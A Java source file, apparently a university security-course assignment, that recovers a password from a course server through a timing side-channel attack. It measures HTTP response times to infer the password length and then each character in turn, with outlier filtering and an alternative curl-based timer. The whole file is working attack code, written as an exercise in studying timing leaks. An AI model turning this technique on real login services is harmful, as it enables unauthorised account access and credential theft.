import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.*;

public class ex01_M2 {

	static final double LOW_THR = 0.75;
	static final double HI_THR = 1.25;
	static final double MIN_THR_LEN = 1.25;
	static final double MIN_THR_PASS = 1.25;

	//static final String USERNAME = "307889287";
	static final String USERNAME = "305555179";

	static final String URL = "http://aoi.ise.bgu.ac.il/?user=" + USERNAME + "&password=";
	static final String CURL_CMD_START = "curl -s -w \\n%{time_total} -o - ";
	static final String DIFFICULTY = "&difficulty=";

	static final char[] LETTERS = {
			'0', '1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'
	};

	public static void main(String[] args) throws Exception {

		int difficulty = 100000;
		int attempts = 20;

		String passwd = "";

		try {
			passwd = findPasswordAvg(attempts, difficulty);
			//passwd = findPasswordMinIdan(attempts, difficulty);
			System.out.println(USERNAME + " " + passwd + " " + difficulty);
		} catch (Exception e) {
			System.out.println("We have a problem");
		} 
	}

	public static int findPasswordLengthAvg(int attempts, int difficulty) throws Exception {
		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[][] reqTimes = new double[attempts][maxLen];
		double[] reqTimesFiltered = new double[maxLen];
		double curReqTime = 0;
		String passwd;

		for (int i = 0; i < maxLen; i++) {
			reqTimesFiltered[i] = 0;
		}

		for (int i = 0; i < attempts; i++) {
			passwd = "";
			for (int j = 0; j < maxLen; j++) {
				passwd += "a";
				curReqTime = getReqTime(URL + passwd + DIFFICULTY + difficulty);
				reqTimes[i][j] = curReqTime;
			}
		}

		for (int j = 0; j < maxLen; j++) {

			double min = Double.MAX_VALUE;

			double sum = 0; 
			double mean = 0;
			int count = 0;

			for (int i = 0; i < attempts; i++) {
				min = Math.min(reqTimes[i][j], min);
			}

			for (int i = 0; i < attempts; i++) {

				if(reqTimes[i][j] < MIN_THR_LEN*min) {
					sum += reqTimes[i][j];
					count++;
				}
				else {
					reqTimes[i][j] = 0;
				}
			}

			mean = sum / count;

			count = 0;

			for (int i = 0; i < attempts; i++) {
				if (reqTimes[i][j] > 0 && reqTimes[i][j] > LOW_THR*mean && reqTimes[i][j] < HI_THR*mean) {
					reqTimesFiltered[j] += reqTimes[i][j];
					count++;
				}
				else {
					reqTimes[i][j] = 0;
				}
			}

			reqTimesFiltered[j] /= count;
		}

		for (int i = 0; i < maxLen; i++) {

			if (maxReqTime < reqTimesFiltered[i] && reqTimesFiltered[i] != 0) {
				maxReqTime = reqTimesFiltered[i];
				len = i + 1;
			}
		}
		return len;
	}

	public static String findPasswordAvg(int attempts, int difficulty) throws Exception {

		int len = findPasswordLengthAvg(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[][] reqTimes = new double[attempts][lettersLen];
		double[] reqTimesFiltered = new double[lettersLen];
		double curReqTime = 0;
		char curChar = '0';
		String passwd = "";

		String passSuff = new String(new char[len - (passwd.length() + 1)]).replace('\0', '0');

		for (int i = passwd.length(); i < len - 1; i++) {

			maxReqTime = 0;

			for (int j = 0; j < lettersLen; j++) {
				reqTimesFiltered[j] = 0;
			}

			for (int j = 0; j < attempts; j++) {
				for (int k = 0; k < lettersLen; k++) {
					curReqTime = getReqTime(URL + passwd + LETTERS[k] + passSuff + DIFFICULTY + difficulty);
					reqTimes[j][k] = curReqTime;					
				}
			}

			for (int j = 0; j < lettersLen; j++) {
				double sum = 0; 
				double mean = 0;
				int count = 0;
				double min = Double.MAX_VALUE;


				for (int k = 0; k < attempts; k++) {
					min = Math.min(reqTimes[k][j], min);
				}

				for (int k = 0; k < attempts; k++) {

					if(reqTimes[k][j] < MIN_THR_PASS*min) {
						sum += reqTimes[k][j];
						count++;
					}
					else {
						reqTimes[k][j] = 0;
					}
				}

				mean = sum / count;

				count = 0;

				for (int k = 0; k < attempts; k++) {
					if (reqTimes[k][j] > 0 && reqTimes[k][j] > LOW_THR*mean && reqTimes[k][j] < HI_THR*mean) {
						reqTimesFiltered[j] += reqTimes[k][j];
						count++;
					}
					else {
						reqTimes[k][j] = 0;
					}
				}

				reqTimesFiltered[j] /= count;
			}

			for (int j = 0; j < lettersLen; j++) {

				if (maxReqTime < reqTimesFiltered[j] && reqTimesFiltered[j] != 0) {
					maxReqTime = reqTimesFiltered[j];
					curChar = LETTERS[j];
				}
			}

			passwd += curChar;
			passSuff = passSuff.substring(1);
		}


		boolean res;
		for (int i = 0; i < lettersLen; i++) {
			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);

			if (res) {
				passwd += LETTERS[i];
				return passwd;
			}
		}

		return passwd+'z';
	}

	public static int findPasswordLengthMinIdan(int attempts, int difficulty)  throws Exception {

		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[] reqTimes = new double[maxLen];
		double curReqTime = 0;
		String passwd;

		double globalMin = Double.MAX_VALUE;

		for (int i = 0; i < maxLen; i++) {
			reqTimes[i] = Double.MAX_VALUE;
		}

		for (int i = 0; i < attempts; i++) {
			passwd = "";
			for (int j = 0; j < maxLen; j++) {
				passwd += "a";
				curReqTime = getReqTime(URL + passwd + DIFFICULTY + difficulty);
				reqTimes[j] = Math.min(reqTimes[j], curReqTime);

			}
		}

		for (int i = 0; i < maxLen; i++) {
			globalMin = Math.min(reqTimes[i], globalMin);
		}

		double threshold = MIN_THR_LEN*globalMin;
		passwd ="";	
		for (int i = 0; i < maxLen; i++) {
			passwd += "a";
			while(reqTimes[i] > threshold) {
				reqTimes[i] = getReqTime(URL + passwd + DIFFICULTY + difficulty);

			}
		}

		for (int i = 0; i < maxLen; i++) {

			if (maxReqTime < reqTimes[i]) {
				maxReqTime = reqTimes[i];
				len = i + 1;
			}
		}

		return len;
	}

	public static String findPasswordMinIdan(int attempts, int difficulty) throws Exception{

		int len = findPasswordLengthMinIdan(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[] reqTimes = new double[lettersLen];
		double curReqTime = 0;
		char curChar = '0';
		String passwd = "";
		String passSuff = new String(new char[len-(passwd.length()+1)]).replace('\0', '0');

		double globalMin = Double.MAX_VALUE;

		for (int i = passwd.length(); i < len-1; i++) {

			maxReqTime = 0;
			globalMin = Double.MAX_VALUE;

			for (int j = 0; j < lettersLen; j++) {
				reqTimes[j] = Double.MAX_VALUE;
			}

			for (int j = 0; j < attempts; j++) {
				for (int k = 0; k < lettersLen; k++) {
					curReqTime = getReqTime(URL + passwd + LETTERS[k] + passSuff + DIFFICULTY + difficulty);
					reqTimes[k] = Math.min(reqTimes[k], curReqTime);

				}
			}

			for (int j = 0; j < lettersLen; j++) {
				globalMin = Math.min(globalMin, reqTimes[j]);
			}

			double threshold = MIN_THR_PASS*globalMin;

			for (int j = 0; j < lettersLen; j++) {
				while(reqTimes[j] > threshold) {
					reqTimes[j] = getReqTime(URL + passwd + LETTERS[j] + passSuff + DIFFICULTY + difficulty);
				}
			}

			for (int j = 0; j < lettersLen; j++) {

				if (maxReqTime < reqTimes[j]) {
					maxReqTime = reqTimes[j];
					curChar = LETTERS[j];
				}
			}

			passwd += curChar;
			passSuff = passSuff.substring(1);

		}

		boolean res;
		for (int i = 0; i < lettersLen; i++) {
			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);

			if (res) {
				passwd += LETTERS[i];
				return passwd;
			}
		}

		return passwd+'z';
	}



	public static boolean sendReq(String urlString) throws Exception {

		URL url = new URL(urlString);
		URLConnection conn = url.openConnection();
		BufferedReader stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));

		boolean res = stdInput.readLine().equals("1");
		stdInput.close();

		return res;
	}

	public static double getReqTimeNano(String urlString) throws Exception {

		double timeStart = System.nanoTime();

		URL url = new URL(urlString);
		URLConnection conn = url.openConnection();
		BufferedReader stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));

		double timeEnd = System.nanoTime();

		stdInput.close();

		return timeEnd - timeStart;
	}

	public static double getReqTimeCurl(String url) throws Exception {

		String curl_cmd = CURL_CMD_START + url;
		//String res = "";
		String time = "";

		Process process = Runtime.getRuntime().exec(curl_cmd);
		BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

		//res = stdInput.readLine();
		stdInput.readLine();
		time = stdInput.readLine();

		process.destroy();

		return Double.parseDouble(time);
	}

	public static double getReqTime(String urlString) throws Exception {
		return getReqTimeNano(urlString);
		//return (double)getReqTimeCurl(urlString);
	}


}